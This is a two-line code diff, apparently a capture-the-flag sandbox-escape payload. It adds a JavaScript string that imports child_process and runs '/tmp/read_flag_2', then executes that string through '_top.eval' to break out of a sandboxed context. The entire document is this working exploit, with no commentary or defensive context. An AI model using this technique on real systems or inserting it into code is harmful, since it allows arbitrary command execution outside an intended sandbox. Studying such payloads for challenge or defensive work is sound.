@@ -1,0 +1,2 @@
+const code = "(async()=>{try{const{exec}=await import('child_process');exec('/tmp/read_flag_2',(error,stdout,stderr)=>{console.log(`stdout:${stdout}`);console.error(`stderr:${stderr}`);});}catch(err){console.error(`import error:${err}`);}})();";
+_top.eval(code);
